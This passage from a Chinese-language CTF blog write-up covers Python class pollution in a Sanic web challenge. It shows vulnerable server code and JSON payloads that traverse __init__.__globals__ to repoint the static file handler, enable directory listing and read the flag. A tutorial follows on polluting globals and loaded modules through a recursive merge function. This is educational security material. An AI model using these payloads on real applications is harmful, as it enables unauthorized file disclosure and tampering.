/tmp/&quot;</span>+log_dir)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">             f.write(log)</span><br><span class="line">        <span class="comment">#å¤‡ä»½æ—¥å¿—æ–‡ä»¶</span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span>+log_dir_bak)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file_bak, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">             f.write(log)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;ï¼ï¼ï¼æ­¤åœ°ç¦æ­¢èƒ¡æ¥ï¼Œä½ çš„éæ³•æ“ä½œå·²ç»è¢«è®°å½•ï¼ï¼ï¼&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>â€‹è¿™å„¿å‘ç°äº†ä¸ªå¯ä»¥åˆ©ç”¨çš„ç‚¹ï¼Œä¼¼ä¹æœ‰ä¸ªå¯ä»¥åˆ©ç”¨çš„äº§ç”Ÿç›®å½•ç©¿è¶Šçš„ç‚¹äº†ï¼Œå› ä¸ºç”Ÿæˆçš„ log_dir å˜é‡åé¢å¢åŠ äº†ä¸ª <code>..</code>  ä½œä¸ºå¤‡ä»½ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    log_dir=create_log_dir(<span class="number">6</span>)</span><br><span class="line">    log_dir_bak=log_dir+<span class="string">&quot;..&quot;</span></span><br><span class="line">    log_file=<span class="string">&quot;/tmp/&quot;</span>+log_dir+<span class="string">&quot;/access.log&quot;</span></span><br><span class="line">    log_file_bak=<span class="string">&quot;/tmp/&quot;</span>+log_dir_bak+<span class="string">&quot;/access.log.bak&quot;</span></span><br><span class="line">    log=<span class="string">&#x27;key: &#x27;</span>+<span class="built_in">str</span>(key)+<span class="string">&#x27;|&#x27;</span>+<span class="string">&#x27;value: &#x27;</span>+<span class="built_in">str</span>(value);</span><br><span class="line">    <span class="comment">#ç”Ÿæˆæ—¥å¿—æ–‡ä»¶</span></span><br><span class="line">    os.system(<span class="string">&quot;mkdir /tmp/&quot;</span>+log_dir)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(log_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">         f.write(log)</span><br><span class="line">    <span class="comment">#å¤‡ä»½æ—¥å¿—æ–‡ä»¶</span></span><br><span class="line">    os.system(<span class="string">&quot;mkdir /tmp/&quot;</span>+log_dir_bak)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(log_file_bak, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">         f.write(log)</span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;ï¼ï¼ï¼æ­¤åœ°ç¦æ­¢èƒ¡æ¥ï¼Œä½ çš„éæ³•æ“ä½œå·²ç»è¢«è®°å½•ï¼ï¼ï¼&quot;</span>)</span><br></pre></td></tr></table></figure><p>â€‹ä¸è¿‡å…ˆè®¿é—®ä¸‹æœºå¯†è·¯ç”± <code>Wa58a1qEQ59857qQRPPQ</code> ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag in /app,but you need to find his nameï¼ï¼ï¼</span><br><span class="line">Find a way to see the file names in the app directory</span><br></pre></td></tr></table></figure><p>â€‹æç¤ºå¾ˆæ˜æ˜¾äº†ï¼Œflag åœ¨ /app æ–‡ä»¶å¤¹å†…ã€‚</p><p>â€‹è¿™é‡Œä¼¼ä¹æœ‰ä¸ªæ²¡ç”¨åˆ°çš„çœ‹èµ·æ¥å¾ˆé‡è¦çš„ç‚¹ï¼Œå…ˆæå‰éšä¾¿è¿›è¡Œä¸€æ¬¡ä¸ªä¸èƒ½æˆåŠŸçš„æ±¡æŸ“ï¼Œæ¯”å¦‚ key ä¸­å­˜åœ¨ parts å­—ç¬¦ä¸²ã€‚ä¹‹åè®¿é—®ä¸‹è¿™ä¸ª <code>adminLook</code>  è·¯ç”±è¯•è¯•:</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">total 0</span><br><span class="line">drwxrwxrwt 1 root root 57 Jul 21 23:04 .</span><br><span class="line">drwxr-xr-x 1 root root 43 Jul 21 22:49 ..</span><br><span class="line">drwxr-xr-x 2 root root 24 Jul 21 23:04 73ycOr</span><br><span class="line">drwxr-xr-x 2 root root 28 Jul 21 23:04 73ycOr..</span><br><span class="line">drwx------ 2 root root 31 Jul 21 22:49 pymp-zra4pxem</span><br></pre></td></tr></table></figure><p>â€‹å¯ä»¥çœ‹åˆ°ï¼ŒæˆåŠŸäº§ç”Ÿäº†ä¸€ä¸ªç»“å°¾ä¸¤ä¸ªç‚¹çš„ç›®å½•ï¼Œä¹‹åå°±æ˜¯æ±¡æŸ“ base å±æ€§è¿›è¡Œç›®å½•ç©¿è¶Šäº†ï¼Œpayload å¦‚ä¸‹ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#å…ˆåˆ‡æ¢åˆ°/tepç›®å½•ä¸‹</span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/tmp&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">#å¯¹baseå±æ€§è¿›è¡Œæ±¡æŸ“</span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.base&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;static/73ycOr&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">#æ‰“å¼€ç›®å½•åŠŸèƒ½</span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹ç„¶åè®¿é—® <code>/static/73ycOr../</code>  æ‰¾åˆ°äº† flag æ–‡ä»¶çš„æ–‡ä»¶åï¼š <code>45W698WqtsgQT1_flag</code> ã€‚</p><p>â€‹ä¹‹åæ±¡æŸ“é™æ€æ–‡ä»¶ç›®å½•ä¸ºæ ¹ç›®å½•ï¼Œç„¶åè®¿é—® <code>/static/app/45W698WqtsgQT1_flag</code>  å³å¯ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹flag: <code>DASCTF&#123;8543c470-d4aa-4668-b051-43ed5c9517b1&#125;</code></p><h1 id="pythonåŸå‹é“¾æ±¡æŸ“å˜ä½“è·Ÿéšarticle_kelpå­¦"><a class="markdownIt-Anchor" href="#pythonåŸå‹é“¾æ±¡æŸ“å˜ä½“è·Ÿéšarticle_kelpå­¦">#</a> Python åŸå‹é“¾æ±¡æŸ“å˜ä½“ (è·Ÿéš Article_kelp å­¦)</h1><p>â€‹å‰é¢çš„åŸºç¡€å·²ç»è¯´è¿‡äº†ï¼Œè¿™é‡Œå°±è·³è¿‡äº†ï¼Œå…·ä½“å¯ä»¥çœ‹çœ‹ä¹‹å‰çš„ merge å‡½æ•°æ–¹é¢çš„å†…å®¹ã€‚</p><h2 id="1-æ›´å¹¿æ³›çš„è·å–"><a class="markdownIt-Anchor" href="#1-æ›´å¹¿æ³›çš„è·å–">#</a> 1ã€æ›´å¹¿æ³›çš„è·å–ï¼š</h2><p>â€‹æ±¡æŸ“ç±»å±æ€§æ˜¯å¯ä»¥é€šè¿‡ç¤ºä¾‹çš„ <code>__base__</code> å±æ€§æŸ¥æ‰¾åˆ°å…¶ç»§æ‰¿çš„çˆ¶ç±»ï¼Œä½†æ˜¯å¦‚æœç›®æ ‡ç±»ä¸åˆ‡å…¥ç‚¹ç±»æˆ–å®ä¾‹æ²¡æœ‰ç»§æ‰¿å…³ç³»æ—¶ï¼Œè¿™ç§æ–¹æ³•å°±æ˜¾å¾—ååˆ†æ— åŠ›ï¼Œä»£ç åœ¨ä¸Šé¢ä¹Ÿæ—©å·²ç»™å‡ºæ¥äº†ã€‚</p><h2 id="2-å…¨å±€å˜é‡çš„è·å–"><a class="markdownIt-Anchor" href="#2-å…¨å±€å˜é‡çš„è·å–">#</a> 2ã€å…¨å±€å˜é‡çš„è·å–ï¼š</h2><p>â€‹åœ¨ <code>Python</code>  ä¸­ï¼Œå‡½æ•°æˆ–ç±»æ–¹æ³•ï¼ˆå¯¹äºç±»çš„å†…ç½®æ–¹æ³•å¦‚ <code>__init__</code> è¿™äº›æ¥è¯´ï¼Œå†…ç½®æ–¹æ³•åœ¨å¹¶æœªé‡å†™æ—¶å…¶æ•°æ®ç±»å‹ä¸ºè£…é¥°å™¨å³ <code>wrapper_descriptor</code> ï¼Œåªæœ‰åœ¨é‡å†™åæ‰æ˜¯å‡½æ•° <code>function</code> ï¼‰å‡å…·æœ‰ä¸€ä¸ª <code>__globals__</code> å±æ€§ï¼Œè¯¥å±æ€§å°†å‡½æ•°æˆ–ç±»æ–¹æ³•æ‰€ç”³æ˜çš„å˜é‡ç©ºé—´ä¸­çš„å…¨å±€å˜é‡ä»¥å­—å…¸çš„å½¢å¼è¿”å›ï¼ˆç›¸å½“äºè¿™ä¸ªå˜é‡ç©ºé—´ä¸­çš„ <code>globals</code>  å‡½æ•°çš„è¿”å›å€¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">secret_var = <span class="number">114</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">a</span>:</span><br><span class="line">    secret_class_var = <span class="string">&quot;secret&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">b</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = b()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;secret_var&quot;</span> : <span class="number">514</span>,</span><br><span class="line">                <span class="string">&quot;a&quot;</span> : &#123;</span><br><span class="line">                    <span class="string">&quot;secret_class_var&quot;</span> : <span class="string">&quot;Pooooluted ~&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a.secret_class_var)</span><br><span class="line"><span class="comment">#secret</span></span><br><span class="line"><span class="built_in">print</span>(secret_var)</span><br><span class="line"><span class="comment">#114</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line"><span class="built_in">print</span>(a.secret_class_var)</span><br><span class="line"><span class="comment">#Pooooluted ~</span></span><br><span class="line"><span class="built_in">print</span>(secret_var)</span><br><span class="line"><span class="comment">#514</span></span><br></pre></td></tr></table></figure><h2 id="3-å·²åŠ è½½æ¨¡å—è·å–"><a class="markdownIt-Anchor" href="#3-å·²åŠ è½½æ¨¡å—è·å–">#</a> 3ã€å·²åŠ è½½æ¨¡å—è·å–ï¼š</h2><p>â€‹å±€é™äºå½“å‰æ¨¡å—çš„å…¨å±€å˜é‡è·å–æ˜¾ç„¶ä¸å¤Ÿï¼Œå¾ˆå¤šæƒ…å†µä¸‹éœ€è¦å¯¹å¹¶ä¸æ˜¯å®šä¹‰åœ¨å…¥å£æ–‡ä»¶ä¸­çš„ç±»å¯¹è±¡æˆ–è€…å±æ€§ï¼Œè€Œæˆ‘ä»¬çš„æ“ä½œä½ç½®åˆåœ¨å…¥å£æ–‡ä»¶ä¸­ï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦å¯¹å…¶ä»–åŠ è½½è¿‡çš„æ¨¡å—æ¥è·å–äº†</p><h3 id="åŠ è½½å…³ç³»ç®€å•"><a class="markdownIt-Anchor" href="#åŠ è½½å…³ç³»ç®€å•">#</a> åŠ è½½å…³ç³»ç®€å•ï¼š</h3><p>â€‹åœ¨åŠ è½½å…³ç³»ç®€å•çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä»æ–‡ä»¶çš„ <code>import</code>  è¯­æ³•éƒ¨åˆ†æ‰¾åˆ°ç›®æ ‡æ¨¡å—ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è·å–å…¨å±€å˜é‡æ¥å¾—åˆ°ç›®æ ‡æ¨¡å—ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#test.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> test_1</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;test_1&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;secret_var&quot;</span> : <span class="number">514</span>,</span><br><span class="line">                <span class="string">&quot;target_class&quot;</span> : &#123;</span><br><span class="line">                    <span class="string">&quot;secret_class_var&quot;</span> : <span class="string">&quot;Poluuuuuuted ~&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(test_1.secret_var)</span><br><span class="line"><span class="comment">#secret</span></span><br><span class="line"><span class="built_in">print</span>(test_1.target_class.secret_class_var)</span><br><span class="line"><span class="comment">#114</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line"><span class="built_in">print</span>(test_1.secret_var)</span><br><span class="line"><span class="comment">#514</span></span><br><span class="line"><span class="built_in">print</span>(test_1.target_class.secret_class_var)</span><br><span class="line"><span class="comment">#Poluuuuuuted ~</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#test_1.py</span></span><br><span class="line"></span><br><span class="line">secret_var = <span class="number">114</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">target_class</span>:</span><br><span class="line">    secret_class_var = <span class="string">&quot;secret&quot;</span></span><br></pre></td></tr></table></figure><h3 id="åŠ è½½å…³ç³»å¤æ‚ç¤ºä¾‹"><a class="markdownIt-Anchor" href="#åŠ è½½å…³ç³»å¤æ‚ç¤ºä¾‹">#</a> åŠ è½½å…³ç³»å¤æ‚â€“ç¤ºä¾‹ï¼š</h3><p>â€‹å¦‚ <code>CTF</code>  é¢˜ç›®ç­‰å®é™…ç¯å¢ƒä¸­å¾€å¾€æ˜¯å¤šå±‚æ¨¡å—å¯¼å…¥ï¼Œç”šè‡³æ˜¯å­˜åœ¨äºå†…ç½®æ¨¡å—æˆ–ä¸‰æ–¹æ¨¡å—ä¸­å¯¼å…¥ï¼Œè¿™ä¸ªæ—¶å€™é€šè¿‡ç›´æ¥çœ‹ä»£ç æ–‡ä»¶ä¸­ <code>import</code>  è¯­æ³•æŸ¥æ‰¾å°±ååˆ†å›°éš¾ï¼Œè€Œè§£å†³æ–¹æ³•åˆ™æ˜¯åˆ©ç”¨ <code>sys</code>  æ¨¡å—</p><p>â€‹ <code>sys</code>  æ¨¡å—çš„ <code>modules</code>  å±æ€§ä»¥å­—å…¸çš„å½¢å¼åŒ…å«äº†ç¨‹åºè‡ªå¼€å§‹è¿è¡Œæ—¶æ‰€æœ‰å·²åŠ è½½è¿‡çš„æ¨¡å—ï¼Œå¯ä»¥ç›´æ¥ä»è¯¥å±æ€§ä¸­è·å–åˆ°ç›®æ ‡æ¨¡å—.`</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#test.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> test_1</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;sys&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;modules&quot;</span> : &#123;</span><br><span class="line">                    <span class="string">&quot;test_1&quot;</span> : &#123;</span><br><span class="line">                        <span class="string">&quot;secret_var&quot;</span> : <span class="number">514</span>,</span><br><span class="line">                        <span class="string">&quot;target_class&quot;</span> : &#123;</span><br><span class="line">                            <span class="string">&quot;secret_class_var&quot;</span> : <span class="string">&quot;Poluuuuuuted ~&quot;</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(test_1.secret_var)</span><br><span class="line"><span class="comment">#secret</span></span><br><span class="line"><span class="built_in">print</span>(test_1.target_class.secret_class_var)</span><br><span class="line"><span class="comment">#114</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line"><span class="built_in">print</span>(test_1.secret_var)</span><br><span class="line"><span class="comment">#514</span></span><br><span class="line"><span class="built_in">print</span>(test_1.target_class.secret_class_var)</span><br><span class="line"><span class="comment">#Poluuuuuuted ~</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#test_1.py</span></span><br><span class="line"></span><br><span class="line">secret_var = <span class="number">114</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">target_class</span>:</span><br><span class="line">    secret_class_var = <span class="string">&quot;secret&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>â€‹å½“ç„¶æˆ‘ä»¬å»ä½¿ç”¨çš„ <code>Payload</code>  ç»å¤§éƒ¨åˆ†æƒ…å†µä¸‹æ˜¯ä¸ä¼šè¿™æ ·çš„ï¼Œå¦‚ä¸Šçš„ <code>Payload</code>  å®é™…ä¸Šæ˜¯åœ¨å·²ç» <code>import sys</code>  çš„æƒ…å†µä¸‹ä½¿ç”¨çš„ï¼Œè€Œå¤§éƒ¨åˆ†æƒ…å†µæ˜¯æ²¡æœ‰ç›´æ¥å¯¼å…¥çš„ï¼Œè¿™æ ·é—®é¢˜å°±ä»<strong>å¯»æ‰¾ <code>import</code>  ç‰¹å®šæ¨¡å—çš„è¯­å¥</strong>è½¬æ¢ä¸º<strong>å¯»æ‰¾ <code>import</code>  äº† sys æ¨¡å—çš„è¯­å¥</strong>ï¼Œå¯¹é—®é¢˜è§£å†³çš„å¹¶ä¸è§å¾—æœ‰å¤šå°‘ä¼˜åŒ–</p><h2 id="4-å‡½æ•°å½¢å‚é»˜è®¤å€¼æ›¿æ¢"><a class="markdownIt-Anchor" href="#4-å‡½æ•°å½¢å‚é»˜è®¤å€¼æ›¿æ¢">#</a> 4ã€å‡½æ•°å½¢å‚é»˜è®¤å€¼æ›¿æ¢ï¼š</h2><p>â€‹ä¸»è¦ç”¨åˆ°äº†å‡½æ•°çš„ <code>__defaults__</code> å’Œ <code>__kwdefaults__</code> è¿™ä¸¤ä¸ªå†…ç½®å±æ€§</p><h4 id="__defaults__"><a class="markdownIt-Anchor" href="#__defaults__">#</a>  <code>__defaults__</code> ï¼š</h4><p>â€‹ <code>__defaults__</code> ä»¥å…ƒç»„çš„å½¢å¼æŒ‰ä»å·¦åˆ°å³çš„é¡ºåºæ”¶å½•äº†å‡½æ•°çš„ä½ç½®æˆ–é”®å€¼å½¢å‚çš„é»˜è®¤å€¼ï¼Œéœ€è¦æ³¨æ„è¿™ä¸ªä½ç½®æˆ–é”®å€¼å½¢å‚æ˜¯ç‰¹å®šçš„ä¸€ç±»å½¢å‚ï¼Œå¹¶ä¸æ˜¯ä½ç½®å½¢å‚ + é”®å€¼å½¢å‚ï¼Œå…³äºå‡½æ•°çš„å‚æ•°åˆ†ç±»å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š<span class="exturl" 